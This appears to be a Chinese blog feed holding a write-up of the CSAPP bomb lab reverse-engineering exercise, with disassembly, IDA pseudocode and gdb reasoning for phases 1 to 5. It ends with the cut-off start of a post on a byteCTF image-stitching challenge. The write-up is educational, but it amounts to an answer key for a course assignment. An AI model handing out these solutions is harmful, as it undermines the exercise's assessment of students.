<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">	    infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">  	  <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">	      <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">	      <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">  	  &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    initialize_bomb();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line">    input = read_line();           </span><br><span class="line">    phase_1(input);                  </span><br><span class="line">    phase_defused();             </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>main.c</code>我们可以知道所有关于密码正确与否都是在phase函数中完成的.</p>
<h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>最简单的一关, 有无数种方法可以搞定.</p>
<ul>
<li>IDA<br>IDA 静态分析神器的大名早有耳闻, 所以第一时间就想到了使用 IDA. </li>
</ul>
<p>不出我所料, 反编译后发现就是把我们输入的密码<code>input</code>与代码中的一段字符串常量进行了比较. 非常轻松.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/1.png" alt title class>
                <p></p>
            </figure>

<p>由于IDA不是本次实验的重点, 就不在此重点展开了.</p>
<p>重点是使用 <code>gdb</code> 调试器的方法来获取 <code>password</code></p>
<ul>
<li>gdb</li>
</ul>
<p>由于一开始没有找到中意的图形化界面调试器, 我在 <code>YW 大佬</code> 的推荐下使用了<code>pwndbg</code> 这个工具, 确实很强大, 而且和 <code>gdb</code>的使用方法基本相同. </p>
<p><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/2.png" alt></p>
<p>因为密码的判断在<code>phase_2</code>中, 我就先调试这段代码. 密码什么的先随便输一个.</p>
<p>进入后最显眼的还是<code>strings_not_equal</code>这个函数. (因为整个屏幕就这里有人话……)</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/3.png" alt title class>
                <p></p>
            </figure>

<p>调用函数后, 汇编代码是如何实现输错密码就爆炸, 输对不爆炸的呢?</p>
<p>调用<code>strings_not_equals</code>后, 其返回值会保存在寄存器 <code>$eax</code> 中.</p>
<p>下面的指令 <code>test</code> 会让两个操作数做与运算, 但是结果并不保存在寄存器或是内存中, 而是发送到 flag寄存器 中的某个标志位(大概记得是第6位, 记不清了).</p>
<p>再下面一行的 <code>je</code> 就会读取该标志位, 如果为零就跳转, 否则不跳转. 可是在这里一旦不跳转而是继续顺序执行, 就会调用 <code>explode_bomb</code>, 程序会不可逆的走向终止.</p>
<p>也就是为了不让炸弹启动, 一定要保证<code>strings_not_equal</code>返回 0 才可以, 这也就是密码的由来.</p>
<h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>从第二题开始就增加难度了, 经过漫长的尝试, 我终于搞出了密码.</p>
<p>进入<code>phase_2</code>, 首先被调用的函数就是<code>read_six_numbers</code>. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>我这里遇到的第一个问题就是搞不懂<code>&lt;__isoc99_sscanf@plt&gt;</code>的作用, 当时十分迷惑为啥进入了<code>phase_2</code>后还要继续输入, 但其实不是这么回事, 这个函数在这里是格式化字符串的作用.</p>
<p>举个例子:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>( dtm, <span class="string">"Saturday March 25 1989"</span> );</span><br><span class="line"><span class="built_in">sscanf</span>( dtm, <span class="string">"%s %s %d  %d"</span>, weekday, month, &amp;day, &amp;year )</span><br><span class="line"><span class="comment">//=&gt; weekday = Saturday, month = March, day = 25, year = 1989</span></span><br></pre></td></tr></table></figure>

<p>当我们调用<code>&lt;__isoc99_sscanf@plt&gt;</code>时, 传入的参数为:</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/5.png" alt title class>
                <p></p>
            </figure>

<p>可以看到这里的前两个参数就对应着C语言中的代码. 最后函数会将字符串中的 6 个整数提取出来(恐怕这也是这段函数名为<code>read_six_numbers</code>的原因)</p>
<p>从<code>sscanf</code>返回后, <code>$eax</code>中保存着提取的整数个数, 紧接着会进行比较是否大于5, 如果不是就会触发炸弹.</p>
<p>从<code>read_six_numbers</code>返回到<code>phase_2</code>后, 会进入密码的验证阶段.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">    #### 程序从这里返回</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><code>cmpl   $0x1,(%rsp)</code> , 在调试器中跟进很容易发现这里是把我们输入的第一个整数和1比较, 得出第一个数字是 1. 如果这里正确的话, 会跳转至<code>400f30</code>, 随后进入一段迭代.</p>
<p>仔细分析迭代的代码, 会发现每次决定我们生死的指令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">400f1c:	39 03                	cmp    %eax,(%rbx)</span><br></pre></td></tr></table></figure>

<p>通过跟进调试器, 这段迭会通过<code>$rbx</code>和<code>$rbp</code>两个寄存器组成一对上下标来访问访问处于栈中的我们的6个整数, 并且在每轮迭代使寄存器<code>$eax</code>的值等于上个整数的值再×2. 那么为了每次的判断为真, 需要前后两个整数差一倍, 规律就出来了, 即 1, 2 ,4 ,8, 16, 32.</p>
<h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>这道题先看<code>phase_3</code>的前几行汇编.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br></pre></td></tr></table></figure>

<p>这里也有<code>isoc99_sscanf</code>, 通过查看常量和使用调试器跟进, 发现是读取两个整数.</p>
<p>从<code>sscanf</code>返回回来后, <code>$eax</code>与常量 1 比较, 可知至少要输入 2 个数字.</p>
<p><code>cmpl   $0x7,0x8(%rsp)</code> 可知输入的第一个数要小于等于7.</p>
<p>然后会进入一个<code>switch</code>的环节.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/6.png" alt title class>
                <p></p>
            </figure>

<p><code>400f75:    ff 24 c5 70 24 40 00     jmpq   *0x402470(,%rax,8)</code></p>
<p>跳转地址的公式为 : <code>0x402470 + ($rax * 8)</code> 就形成了一个类似<code>switch case</code>的功能. <code>$rax</code>在这里存放的是我输入的第一个数字.</p>
<p>我在这里遇到的一个问题是, 在通过调试器跟进时, 发现哪条指令都没对<code>$rax</code>进行操作, 莫名其妙的最后就成了我输入的第一个数字. 后来才知道<code>rax(64位)</code>和<code>eax(32位)</code>是共享32位的, 对<code>eax</code>的操作约等于<code>rax</code>(不溢出的前提下).</p>
<p>进入<code>swtich</code>后, 程序会对 <code>eax</code> 再赋某一个常量, 最后再把它和我们输入的第二个数比较, 相等就成了. 所以这道题的答案不唯一, 只要进到的分支能和最后的输入匹配上就好了. </p>
<h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>先看汇编代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>还是用的<code>sscanf</code>来提取输入的整数, 且这次只能输入两个.</p>
<p>这道题强烈推荐使用 ida 的生成伪代码的功能.</p>
<p>phase_4 :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">phase_4</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_sscanf(a1, <span class="string">"%d %d"</span>, &amp;v2, &amp;v3) != <span class="number">2</span> || v2 &gt; <span class="number">0xE</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  result = func4(v2, <span class="number">0L</span>L, <span class="number">14L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result || v3 )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>func4 :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = ((<span class="keyword">signed</span> <span class="keyword">int</span>)a3 - (<span class="keyword">signed</span> <span class="keyword">int</span>)a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)func4(a1, a2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a1 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)func4(a1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于转换为 c 伪代码后分析成本降低了非常多, 我就不具体展开了.</p>
<h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>ida 伪代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">phase_5</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+16h] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)string_length((_BYTE *)a1) != <span class="number">6</span> )</span><br><span class="line">    explode_bomb(a1);</span><br><span class="line">  v1 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3[v1] = array_3449[*(_BYTE *)(a1 + v1) &amp; <span class="number">0xF</span>];</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != <span class="number">6</span> );</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strings_not_equal(v3, <span class="string">"flyers"</span>) )</span><br><span class="line">    explode_bomb(v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码和使用调试器分析可知, 每次我们输入的字符串(<code>input</code>)的各位会被取出来和<code>0xF</code>相与, 结果会被作为字符串<code>source = &quot;aduiersnfotvbyl&quot;</code>的下标(<code>input[i]&amp;0xF</code>). 再根据此下标取出字符串中的相应字符(<code>source[index]</code>)保存于另一个字符串<code>result</code>中, 只有最后<code>result = &quot;flyers&quot;</code>才能成功. </p>
<p>用下面的表可以得出 payload.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flyers</span><br><span class="line"></span><br><span class="line">0x39 0x3f 0x3e 0x35 0x36 0x37</span><br><span class="line"></span><br><span class="line">   9    ?    &gt;    5    6    7</span><br><span class="line"></span><br><span class="line">a d u i e r s n f   o   t   v   b   y   l</span><br><span class="line"></span><br><span class="line">1 2 3 4 5 6 7 8 9  10  11  12  13  14  15</span><br><span class="line"></span><br><span class="line">                  0xa 0xb 0xc 0xd 0xe 0xf</span><br></pre></td></tr></table></figure>

<h4 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h4><p>太长了, 懒得写了, 啥时候有空更下.</p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> 文件系统 </tag>
            
            <tag> OS </tag>
            
            <tag> c语言 </tag>
            
            <tag> 网络 </tag>
            
            <tag> smtp </tag>
            
            <tag> Reverse </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[拼接图像]]></title>
      <url>/2019/09/25/%E6%9D%82%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>null.</p>
<a id="more"></a>
<h1 id="python-拼接图像"><a href="#python-拼接图像" class="headerlink" title="python 拼接图像"></a>python 拼接图像</h1><p>在我们协会的平台上看的一道题.</p>
<p><a href="http://ctf.teamdie.club/files/45c9b42681825f26b823e44736e16a5a/d9710b4ddcbf457cb716ee5423c7f32e.zip" target="_blank" rel="noopener">附件链接</a></p>
<p>题目描述:</p>
<blockquote>
<p>[medium]<br>谁把我壁纸切了啊 ?<br>prpr~<br>请提交：flag{something}<br>来源：2019字节跳动网络安全大赛(byteCTF)</p>
</blockquote>
<p>附件里有231个小图片. 看这意思是要把它拼成一整张壁纸. <strong>PS大佬可以尝试下手动拼接, 欸嘿嘿</strong></p>
<p>对于这种图像处理的任务, 可以使用python的PIL库. 功能似乎很强大, 正在学习中…</p>
<p>我根据<code>p4ssw0rd学长</code>的一道类似题的python代码, A了这道题. </p>
<p>边看代码边分析:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">"./all/"</span></span><br><span class="line"><span class="comment"># 获取文件列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_list</span><span class="params">(file_path)</span>:</span></span><br><span class="line">    dir_list = os.listdir(file_path) <span class="comment"># 未排序</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span 